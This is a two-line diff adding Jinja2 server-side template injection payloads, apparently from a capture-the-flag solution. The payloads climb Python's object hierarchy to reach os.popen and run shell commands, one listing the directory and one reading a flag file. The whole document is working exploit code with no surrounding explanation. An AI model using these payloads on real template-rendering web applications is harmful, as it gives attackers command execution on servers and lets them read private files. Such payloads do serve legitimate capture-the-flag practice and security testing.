@@ -1,0 +1,2 @@
+{{"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('ls').read()}}
+{{"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat /th1s_15_fl4ggggggg').read()}}
